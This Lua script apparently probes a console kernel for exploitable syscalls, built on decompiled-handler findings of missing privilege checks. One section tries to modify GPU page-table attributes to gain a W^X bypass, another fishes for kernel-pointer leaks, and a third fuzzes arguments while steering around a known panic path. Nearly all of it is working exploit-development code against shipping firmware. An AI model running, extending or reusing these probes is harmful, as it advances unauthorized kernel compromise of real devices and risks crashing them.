-- CRASH_CLASS: MODERATE (GPU PTE modification could destabilize display/GPU)
-- PROBE 84a: sys 653 — GPU page table attribute modifier with NO privilege check
--
-- Context: Decompiled 13.60 handler analysis reveals sys 653 is an 8KB handler that
-- modifies GPU/display page table attributes. CRITICAL findings:
--   1. ZERO priv_check calls in entire handler
--   2. ZERO ucred accesses for permission decisions
--   3. Only gate is bitmask 0xffafffff on arg0 (trivially satisfied)
--   4. Can modify PTE attributes: cacheability, protection, page type
--   5. Potential to change R/O GPU pages to R/W (W^X bypass for GPU memory)
--
-- The handler reads proc+0x5d0 and proc+0x5c4 as metadata. If our process has
-- any GPU context (even minimal), this handler could work.
--
-- NEVER TESTED on 14.10 — sys 653 is not in the dead ends list.
--
-- Handler structure (from decompile):
--   0x000: Entry — validates arg0 mask, reads proc+0x5d0/+0x5c4, alloc tracking
--   0x220: 2MB page iterator
--   0x550: Core privilege page op (feature gate at struct+0x244 bit 0x1)
--   0x860: Entry type scanner (bits 28-29: type 0=skip, 1=process, >=2=panic!)
--   0x1850: Direct page modification (address bounds, type bitmask 0x409)
--
-- WARNING: Type >=2 in entry scanner causes KERNEL PANIC. Probe must avoid this.
-- Section A is safe (just calling with various arg0 values to see what happens).

local TEST_SECTION = "C"

print("=== PROBE 84a: SYS 653 GPU PTE MODIFIER (NO PRIV CHECK) ===")
print("TEST_SECTION=" .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_653 = make_syscall(653)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive, pid = canary()
print("[0] canary pid=" .. tostring(pid))

-- ==============================
-- SECTION A: Basic reachability with various arg0 values
-- ==============================
if TEST_SECTION == "A" then
    print("")
    print("=== SECTION A: BASIC REACHABILITY ===")
    print("[A] sys 653 narg=1, handler accepts arg0 as parameter struct pointer")
    print("[A] Entry validates arg0 against mask 0xffafffff")
    print("[A] Testing with various arg0 values to determine reachability")
    print("")

    -- The handler is narg=1 and appears to use arg0 as EITHER a direct value
    -- OR a pointer to a parameter structure. The decompile shows mask validation
    -- on arg0 first, then reads proc+0x5d0/+0x5c4.

    -- Test 1: Simple values that pass the mask 0xffafffff
    -- The mask blocks bits 20 and 22 (0x00500000), meaning arg0 can have any
    -- bits EXCEPT those two. Actually: "only bits 20,22 allowed" means
    -- arg0 & ~0xffafffff must be zero, i.e., arg0 & 0x00500000 == arg0 & ~0xffafffff
    -- Bits 20 and 22 map to 0x100000 and 0x400000
    -- So valid arg0 values have ONLY bits 20 and/or 22 set? That seems restrictive.
    -- Let me test both interpretations.

    print("[A] Test 1: arg0 = 0 (null)")
    local ok0, rv0 = pcall(function() return sc_653(uint64(0)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok0), rv0 and q(rv0) or "nil"))

    local ca1, _ = canary()
    if not ca1 then print("[A] *** DIED on arg0=0 ***") return end

    print("[A] Test 2: arg0 = 1")
    local ok1, rv1 = pcall(function() return sc_653(uint64(1)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok1), rv1 and q(rv1) or "nil"))

    local ca2, _ = canary()
    if not ca2 then print("[A] *** DIED on arg0=1 ***") return end

    -- Test with bit 20 set (0x100000)
    print("[A] Test 3: arg0 = 0x100000 (bit 20)")
    local ok3, rv3 = pcall(function() return sc_653(uint64(0x100000)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok3), rv3 and q(rv3) or "nil"))

    local ca3, _ = canary()
    if not ca3 then print("[A] *** DIED on arg0=0x100000 ***") return end

    -- Test with bit 22 set (0x400000)
    print("[A] Test 4: arg0 = 0x400000 (bit 22)")
    local ok4, rv4 = pcall(function() return sc_653(uint64(0x400000)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok4), rv4 and q(rv4) or "nil"))

    local ca4, _ = canary()
    if not ca4 then print("[A] *** DIED on arg0=0x400000 ***") return end

    -- Test with both bits 20+22 (0x500000)
    print("[A] Test 5: arg0 = 0x500000 (bits 20+22)")
    local ok5, rv5 = pcall(function() return sc_653(uint64(0x500000)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok5), rv5 and q(rv5) or "nil"))

    local ca5, _ = canary()
    if not ca5 then print("[A] *** DIED on arg0=0x500000 ***") return end

    -- Test with a pointer to allocated buffer (in case arg0 is a struct pointer)
    print("")
    print("[A] Test 6: arg0 = pointer to zeroed 0x200-byte struct")
    local buf = memory.alloc(0x200)
    zero(buf, 0x200)
    local ok6, rv6 = pcall(function() return sc_653(uint64(buf)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok6), rv6 and q(rv6) or "nil"))

    local ca6, _ = canary()
    if not ca6 then print("[A] *** DIED on struct pointer ***") return end

    -- Check if the handler wrote anything back to our buffer
    print("[A] Checking buffer for handler output...")
    local has_data = false
    for off = 0, 0x1FC, 4 do
        local val = rd(buf + off)
        if val and val ~= 0 then
            has_data = true
            print(string.format("  +0x%03X: 0x%08X", off, val))
        end
    end
    if not has_data then print("  (buffer unchanged)") end

    -- Test with struct containing GPU mmap address
    print("")
    print("[A] Test 7: struct with GPU mmap base in first field")
    local sc_mmap = make_syscall(477)
    local gpu_ok, gpu_addr = pcall(function()
        return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if gpu_ok and gpu_addr then
        print(string.format("[A] GPU mmap base: %s", q(gpu_addr)))
        zero(buf, 0x200)
        wq(buf, gpu_addr) -- address range start
        wq(buf + 8, uint64(to_num(gpu_addr) + 4 * 0x4000)) -- address range end
        wd(buf + 0x10, 0x100000) -- flags with bit 20

        local ok7, rv7 = pcall(function() return sc_653(uint64(buf)) end)
        print(string.format("  ok=%s rv=%s", tostring(ok7), rv7 and q(rv7) or "nil"))

        local ca7, _ = canary()
        if not ca7 then print("[A] *** DIED on GPU struct ***") return end
    else
        print("[A] GPU mmap failed, skipping test 7")
    end

    -- Also check proc+0x5d0 via kinfo_proc to understand context
    print("")
    print("[A] Checking process fields via kinfo_proc (sysctl)...")
    local sc_sysctl = make_syscall(202)
    local mib = memory.alloc(16)
    wd(mib, 1)       -- CTL_KERN
    wd(mib + 4, 14)  -- KERN_PROC
    wd(mib + 8, 1)   -- KERN_PROC_PID
    wd(mib + 12, pid)
    local outbuf = memory.alloc(0x800)
    local oldlenp = memory.alloc(8)
    wd(oldlenp, 0x800)
    zero(outbuf, 0x800)
    local ok_s, rv_s = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    if ok_s and to_num(rv_s) == 0 then
        local outlen = rd(oldlenp)
        print(string.format("[A] kinfo_proc: %d bytes returned", outlen or 0))
        -- Check proc emul_name or GPU context indicators
    end

    local caf, cpid = canary()
    print("[A] final canary: ok=" .. tostring(caf) .. " pid=" .. tostring(cpid))

-- ==============================
-- SECTION B: sys 630 mount enumeration (info leak)
-- ==============================
elseif TEST_SECTION == "B" then
    print("")
    print("=== SECTION B: SYS 630 MOUNT ENUMERATION ===")
    print("[B] Decompiled: ZERO priv_check on all enumeration functions")
    print("[B] Handler narg=1, arg0 = pointer to parameter struct")
    print("")

    local sc_630 = make_syscall(630)
    local BUF = 0x800

    -- The handler dispatches by a command field. The decompile shows:
    --   Entry at 0x000: copyinstr + copyin from user pointer
    --   Multiple sub-commands accessed via arg0 struct

    -- Test 1: Zero arg (see what error we get)
    print("[B] Test 1: arg0 = 0")
    local ok0, rv0 = pcall(function() return sc_630(uint64(0)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok0), rv0 and q(rv0) or "nil"))

    local cb1, _ = canary()
    if not cb1 then print("[B] *** DIED on arg0=0 ***") return end

    -- Test 2: Pointer to command struct
    -- The entry does: copyin from user pointer (first 0x400 bytes is a path string)
    -- Then copyin of an additional structure
    local buf = memory.alloc(0x800)

    -- Try command = 0 (enumerate mounts at 0x0d0)
    print("[B] Test 2: cmd=0 (enumerate mounts)")
    zero(buf, 0x800)
    wd(buf, 0) -- cmd = 0
    local outbuf = memory.alloc(0x2000)
    zero(outbuf, 0x2000)
    wq(buf + 8, uint64(outbuf)) -- output buffer pointer
    wd(buf + 0x10, 0x2000) -- output buffer size

    local ok2, rv2 = pcall(function() return sc_630(uint64(buf)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok2), rv2 and q(rv2) or "nil"))

    local cb2, _ = canary()
    if not cb2 then print("[B] *** DIED on cmd=0 ***") return end

    if ok2 and to_num(rv2) == 0 then
        print("[B] *** MOUNT ENUMERATION SUCCEEDED! ***")
        -- Scan output for mount data
        for off = 0, 0x1FC, 8 do
            local val = rq(outbuf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if vh ~= 0 or vl ~= 0 then
                    local tag = ""
                    if vh >= 0xFFFF8000 then tag = " *** KERNEL PTR! ***" end
                    print(string.format("  +0x%03X: %s%s", off, q(val), tag))
                end
            end
        end
    end

    -- Try commands 1-5 to find the enumeration interface
    for cmd = 1, 8 do
        zero(buf, 0x800)
        wd(buf, cmd)
        wq(buf + 8, uint64(outbuf))
        wd(buf + 0x10, 0x2000)
        zero(outbuf, 0x200)

        local ok_c, rv_c = pcall(function() return sc_630(uint64(buf)) end)
        local r = ok_c and to_num(rv_c) or -999
        print(string.format("[B] cmd=%d: rv=%d", cmd, r))

        local c_ok, _ = canary()
        if not c_ok then
            print("[B] *** DIED at cmd=" .. cmd)
            break
        end

        if r == 0 then
            -- Check for data
            local has_data = false
            for off = 0, 0x100, 8 do
                local val = rq(outbuf + off)
                if val then
                    local vh, vl = get_hi_lo(val)
                    if vh ~= 0 or vl ~= 0 then
                        has_data = true
                        local tag = ""
                        if vh >= 0xFFFF8000 then tag = " *** KERNEL PTR! ***" end
                        print(string.format("    +0x%03X: %s%s", off, q(val), tag))
                    end
                end
            end
            if not has_data then print("    (empty output)") end
        end
    end

    -- Also try with a path string (the entry does copyinstr)
    print("")
    print("[B] Test 3: cmd=0 with '/' path")
    zero(buf, 0x800)
    pcall(function() memory.write_byte(buf, 0x2F) end) -- '/'
    pcall(function() memory.write_byte(buf + 1, 0x00) end)
    -- cmd after the path (offset depends on struct layout)
    wd(buf + 0x400, 0) -- cmd at fixed offset after path

    local ok3, rv3 = pcall(function() return sc_630(uint64(buf)) end)
    print(string.format("  ok=%s rv=%s", tostring(ok3), rv3 and q(rv3) or "nil"))

    local cbf, cb_pid = canary()
    print("[B] final canary: ok=" .. tostring(cbf) .. " pid=" .. tostring(cb_pid))

-- ==============================
-- SECTION C: sys 653 with GPU mmap pages — PTE attribute modification
-- ==============================
elseif TEST_SECTION == "C" then
    print("")
    print("=== SECTION C: GPU PTE ATTRIBUTE MODIFICATION ===")
    print("[C] If section A shows sys 653 is reachable, test PTE changes")
    print("[C] on GPU mmap pages to check if we can modify protection")
    print("")

    -- First, allocate GPU memory
    local sc_mmap = make_syscall(477)
    local PAGE_SIZE = 0x4000 -- 16KB
    local NUM_PAGES = 16
    local gpu_ok, gpu_base = pcall(function()
        return sc_mmap(uint64(0), uint64(NUM_PAGES * PAGE_SIZE), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    if not gpu_ok or not gpu_base then
        print("[C] GPU mmap failed, cannot proceed")
    else
        print(string.format("[C] GPU mmap base: %s (%d pages)", q(gpu_base), NUM_PAGES))

        -- Write test pattern to verify current access
        local base_num = to_num(gpu_base)
        wd(gpu_base, 0xDEADBEEF)
        local verify = rd(gpu_base)
        print(string.format("[C] Write/read test: wrote 0xDEADBEEF, read 0x%08X", verify or 0))

        -- Get current page protection via sys 674 (VM map)
        local sc_674 = make_syscall(674)
        local vm_buf = memory.alloc(0x200)
        zero(vm_buf, 0x200)
        wq(vm_buf, gpu_base) -- start address

        local ok_vm, rv_vm = pcall(function()
            return sc_674(uint64(vm_buf), uint64(0x200), uint64(0))
        end)
        if ok_vm and to_num(rv_vm) == 0 then
            local prot = rd(vm_buf + 0x18)
            print(string.format("[C] VM map protection for GPU page: 0x%X", prot or 0))
        end

        -- Now try sys 653 to modify attributes
        -- According to decompile, the handler at 0x1850 (direct page modifier) checks:
        --   Address bounds against proc->0x200
        --   Page type against bitmask 0x409 (types 0, 3, 10)
        --   Object type at +0x9d must be 0xb
        -- We'll try various arg0 formats

        local buf = memory.alloc(0x200)

        -- Format 1: Direct address + flags
        print("")
        print("[C] Trying sys 653 with GPU page address + attribute flags...")
        local attr_tests = {
            {name="bit20", val=0x100000},
            {name="bit22", val=0x400000},
            {name="bit20+22", val=0x500000},
        }

        for _, attr in ipairs(attr_tests) do
            zero(buf, 0x200)
            wq(buf, gpu_base)  -- target address
            wd(buf + 8, attr.val)  -- attribute flags
            wd(buf + 0xC, NUM_PAGES) -- page count

            local ok_a, rv_a = pcall(function() return sc_653(uint64(buf)) end)
            print(string.format("[C] attr=%s: ok=%s rv=%s",
                attr.name, tostring(ok_a), rv_a and q(rv_a) or "nil"))

            local c_ok, _ = canary()
            if not c_ok then
                print("[C] *** DIED on attr=" .. attr.name)
                break
            end
        end

        -- Verify GPU memory is still accessible
        local post_val = rd(gpu_base)
        print(string.format("[C] Post-test GPU read: 0x%08X (expect 0xDEADBEEF)", post_val or 0))
    end

    local ccf, cc_pid = canary()
    print("[C] final canary: ok=" .. tostring(ccf) .. " pid=" .. tostring(cc_pid))

else
    print("[!] Invalid TEST_SECTION=" .. TEST_SECTION .. " (use A-C)")
end

print("")
print("=== PROBE 84a SECTION " .. TEST_SECTION .. " COMPLETE ===")
print("=== PROBE 84a COMPLETE ===")
